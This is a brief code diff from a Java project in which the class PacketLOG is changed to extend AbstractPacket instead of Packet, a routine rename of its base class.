@@ -9,7 +9,7 @@ import com.redpois0n.Connection;
 import com.redpois0n.utils.Utils;
 
 
-public class PacketLOG extends Packet {
+public class PacketLOG extends AbstractPacket {
 
 	@Override
 	public void read(String line) throws Exception {
